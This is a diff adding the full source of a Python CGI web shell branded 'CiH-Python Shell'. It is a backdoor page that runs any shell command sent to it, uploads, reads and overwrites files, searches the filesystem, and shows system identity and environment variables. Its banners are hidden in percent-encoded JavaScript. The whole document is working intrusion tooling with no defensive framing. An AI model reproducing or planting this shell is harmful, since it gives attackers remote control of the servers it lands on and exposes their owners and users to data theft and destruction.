@@ -1,0 +1,296 @@
+#!/usr/bin/python
+"""
+CiH-Python Shell By CiH
+"""
+
+try:
+    import cgitb; cgitb.enable()
+except:
+    pass
+import sys, cgi, os, base64, subprocess
+from time import strftime
+from string import Template
+
+# HTML
+
+html = Template("""
+<html>
+<head>
+    <title>CiH-Python</title>
+    <meta http-equiv="Content-Type" content="text/html; charset=utf-8" /> 
+    <style>
+        body {
+            color:#fff;
+            background-color:#585858;
+            font-size:11px;
+        }
+        table {
+            font-family: Verdana, Tahoma;
+            font-size:11px;
+        }
+        tr {
+            border: #D9D9D9 1px solid;
+        }
+        td {
+            border: #D9D9D9 1px solid;
+        }
+        a { 
+            color: #fff;
+        }
+        input {
+            background-color:#800000;
+            color:#FFFFFF;
+            font-family:Tahoma;
+            font-size:8pt;
+        }
+        select {
+            background-color:#800000;
+            color:#FFFFFF;
+            font-family:Tahoma;
+            font-size:8pt;
+        }
+        textarea {
+            background-color:#800000;
+            color:#FFFFFF;
+            font-family:Tahoma;
+            font-size:8pt;
+        }
+    </style>
+	<meta name="description" content="CiH-Python V1 2012">
+	<meta name="keywords" content="cih, CiH, Python, cih99">
+</head>
+<body style="background-color: #4A4A4A">
+    <script type="text/javascript">
+        function toggleEnviron()
+        {
+            if (document.getElementById('environ_table').style.display=="none")
+                document.getElementById('environ_table').style.display="";
+            else
+                document.getElementById('environ_table').style.display="none";
+        }
+    </script>
+    <center>
+    <Script Language='Javascript'>
+<!--  -->
+<!--
+document.write(unescape('%3C%63%65%6E%74%65%72%3E%3C%68%32%3E%43%69%48%2D%50%79%74%68%6F%6E%20%56%31%20%32%30%31%32%3C%62%72%3E%0A%09%3C%66%6F%6E%74%20%73%69%7A%65%3D%22%33%22%3E%2E%3A%20%46%75%63%6B%20%41%6C%6C%20%53%79%73%74%65%6D%20%3A%2E%3C%2F%66%6F%6E%74%3E%3C%2F%68%32%3E%3C%2F%63%65%6E%74%65%72%3E'));
+//-->
+</Script>
+    </center>
+    <table width="100%">
+        <tr><td bgcolor="#333333" style="border-color: #000000">
+            <font color="#FFFF00">uname -a: $uname <br />
+            $uid
+        </font>
+        </td></tr>
+    </table>
+    <p />
+    <div style="display:$edit_file_box_visibility">
+        <p />
+    </div>
+    <table width="100%">
+        <tr>    
+            <td style="border-color:#000000; text-align:center" bgcolor="#333333" width="657">
+                <form action="?" method="POST">
+                    <p style="text-align: left">
+                <b>Directory: </b>
+                    <input type="text" value="$cur_dir" size="50" name="cur_dir" style="border: 1px solid #808080; padding-left: 4px; padding-right: 4px; padding-top: 1px; padding-bottom: 1px; background-color: #000000">&nbsp;<input type="submit" value="Go" style="border: 1px outset #000000; padding-left: 4px; padding-right: 4px; padding-top: 1px; padding-bottom: 1px; background-color: #444444">
+                	</p>
+                </form>
+            </td>
+            <td style="border-color:#000000; text-align:center" bgcolor="#333333">
+                <font color="#FFFF00"><b>$cur_dir</b></font></td>
+        </tr>
+    </table>
+    <p />
+    <table width="100%">
+        <tr>
+            <td colspan="2" style="border-color:#000000; text-align:center" bgcolor="#333333">
+			<p align="center"><b><font style="font-size: 9pt" face="Verdana">.: 
+			Directory List :.</font></b></td>
+        </tr>
+        <tr>
+            <td bgcolor="#333333" style="border-color: #000000"><pre><font color="#FFFF00">$list_files</font></pre></td>
+        </tr>
+    </table>
+    <p align="center" />
+    <b><font face="Verdana" style="font-size: 9pt">.: Results of Execution :.</font></b><br />
+    <table width="100%">
+        <tr>
+            <td bgcolor="#333333" style="border-color: #000000">
+                <p align="center">
+                <textarea cols="200" rows="10" style="color: #FFFF00; border: 1px solid #808080; padding-left: 4px; padding-right: 4px; padding-top: 1px; padding-bottom: 1px; background-color: #000000" name="command_result">$command_result</textarea>
+            </td>
+        </tr>
+    </table>
+    <table width="100%">
+        <tr>    
+            <td style="border-color:#000000; text-align:center" width="50%" bgcolor="#333333">
+                <b>.: COMMANDS PANEL :.</b><form action="?" method="POST">
+                    <input type="hidden" value="$cur_dir" size="50" name="cur_dir" />
+                    <p style="text-align: left">Command:
+                    <input type="text" value="" size="50" name="command" style="border: 1px solid #808080; padding-left: 4px; padding-right: 4px; padding-top: 1px; padding-bottom: 1px; background-color: #000000">&nbsp;<input type="submit" value="Execute" style="border: 1px outset #000000; background-color: #444444">
+                	</p>
+                </form>
+            </td>
+        </tr>
+    </table>    
+    <p />
+    <table width="100%">
+        <tr>    
+            <td style="border-color:#000000; text-align:center" bgcolor="#333333">
+                <form action="?" method="POST" enctype="multipart/form-data">
+                    <p style="text-align: left">&nbsp;&nbsp;&nbsp;&nbsp; Upload:
+                    <input type="file" name="file" style="border: 1px solid #808080; padding-left: 4px; padding-right: 4px; padding-top: 1px; padding-bottom: 1px; background-color: #000000" size="33">&nbsp;<input type="submit" value="Upload" style="border: 1px outset #000000; background-color: #444444">
+                    <input type="hidden" value="upload" size="50" name="command" />
+                    <input type="hidden" value="$cur_dir" size="50" name="cur_dir">
+                &nbsp;<font color="#00FF00">[OK]</font> Max size: 40MB</p>
+                </form>
+            </td>
+        </tr>
+    </table>
+    <p />
+    <p />
+    <p />
+<Script Language='Javascript'>
+<!--  -->
+<!--
+document.write(unescape('%20%20%20%20%3C%74%61%62%6C%65%20%77%69%64%74%68%3D%22%31%30%30%25%22%3E%0A%20%20%20%20%20%20%20%20%3C%74%72%3E%0A%20%20%20%20%20%20%20%20%20%20%20%20%3C%74%64%20%73%74%79%6C%65%3D%22%62%6F%72%64%65%72%2D%63%6F%6C%6F%72%3A%23%30%30%30%30%30%30%3B%20%74%65%78%74%2D%61%6C%69%67%6E%3A%63%65%6E%74%65%72%22%20%62%67%63%6F%6C%6F%72%3D%22%23%33%33%33%33%33%33%22%3E%3C%66%6F%6E%74%20%63%6F%6C%6F%72%3D%22%23%30%30%46%46%30%30%22%20%73%69%7A%65%3D%22%31%22%3E%20%2E%3A%5B%20%52%65%2D%43%6F%64%69%6E%67%20%42%79%20%43%69%48%5F%48%40%43%6B%45%72%5A%20%7C%20%63%69%68%5F%68%61%63%6B%65%72%40%79%61%68%6F%6F%2E%63%6F%6D%20%7C%20%47%65%6E%65%72%61%74%65%64%3A%20%30%2E%31%36%38%33%20%73%65%63%6F%6E%64%73%20%5D%3A%2E%20%3C%2F%66%6F%6E%74%3E%3C%2F%74%64%3E%0A%20%20%20%20%20%20%20%20%3C%2F%74%72%3E%0A%20%20%20%20%3C%2F%74%61%62%6C%65%3E%0A'));
+//-->
+</Script>
+</body>
+</html>
+""")
+
+scriptname = ""
+
+if os.environ.has_key("SCRIPT_NAME"):
+    scriptname = os.environ["SCRIPT_NAME"]
+
+def get_environ_table():
+    s = "<table style=\"display:none\" id=\"environ_table\">"
+    for k in os.environ:
+        s+="<tr><td>%s</td><td>%s</td></tr>"%(k,os.environ[k])
+    s+="</table>"
+    return s
+
+def run_command(command):
+    p = subprocess.Popen(command, shell=True, stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.STDOUT, close_fds=True)
+    (i,o) = p.stdin,p.stdout
+    return o.read()
+
+def get_param(form, param,default=None):
+    if form.has_key(param):
+        return form.getvalue(param)
+    return default
+
+def can_write(file_name):
+    try:
+        f = open(file_name,"w")
+        f.close()
+        return True
+    except:
+        return False
+
+def put_script(base_name,encoded_script):
+    script = base64.b64decode(encoded_script)
+    i = 0
+    file_name = "/tmp/"+base_name + str(i)  
+    while not can_write(file_name):
+        i+=1
+        file_name = "/tmp/"+base_name + str(i)  
+    
+    f = open(file_name,"w")
+    f.write(script)
+    f.close()
+    return file_name
+
+def main():
+
+    print "Content-type: text/html"        
+    print                                   
+
+    form = cgi.FieldStorage()
+    uname = run_command("uname -a")
+    uid = run_command("id")
+
+    cur_dir = get_param(form, "cur_dir",os.getcwd())
+
+    if not os.path.exists(cur_dir):
+        cur_dir = os.getcwd()
+    os.chdir(cur_dir)
+    command = get_param(form,"command")
+    command_result = ""
+
+    file_content = ""
+    file_name = ""
+    edit_file_box_visibility = "None"
+
+    if command == "mkdir":
+        new_dir = get_param(form,"new_dir")
+        command_result = run_command("mkdir " + new_dir)	
+    elif command == "upload":
+        upload_file = form["file"]
+        try:
+            f  = open(upload_file.filename,"w")
+            while True:
+                chunk = upload_file.file.read(1024)
+                if not chunk: break
+                f.write(chunk)
+            f.close()
+        except Exception,e:
+            command_result = str(e)
+
+    elif command == "search_text":
+        search_text = get_param(form,"search_text","")
+        search_dir = get_param(form,"search_dir",".")
+        include_pattern = get_param(form,"include_pattern")
+        exclude_pattern = get_param(form,"exclude_pattern")
+        cmd = "grep -ir \"%s\" %s " % (search_text,search_dir)
+        if include_pattern:
+            cmd += "--include=%s " % include_pattern
+        if exclude_pattern:
+            cmd += "--include=%s " % exclude_pattern
+        command_result = run_command(cmd)
+
+    elif command == "edit_file":
+        file_name = get_param(form,"file_name")
+        try:
+            f = open(file_name,"r")
+            file_content = f.read()
+            f.close()
+            edit_file_box_visibility = ""            
+        except:
+            command_result = "Cannot open file"
+            file_content = ""
+            edit_file_box_visibility = "None"
+
+    elif command == "save_file":
+        file_name = get_param(form,"file_name")
+        file_content = get_param(form,"file_content")
+        try:
+            f = open(file_name,"w")
+            f.write(file_content)
+            f.close()
+            command_result = "Successful"
+        except:
+            command_result = "Cannot write to file"
+                
+    elif command != None:
+        command_result = run_command(command)
+
+    list_files = run_command("ls -alh " + cur_dir)
+
+    print html.substitute(environ_table=get_environ_table(),
+                          uname = uname,
+                          uid = uid,
+                          list_files = list_files,
+                          cur_dir = cur_dir,
+                          command_result = command_result,
+                          file_content = file_content,
+                          file_name    = file_name,
+                          edit_file_box_visibility = edit_file_box_visibility
+                            )
+
+if __name__ == '__main__':
+    main()
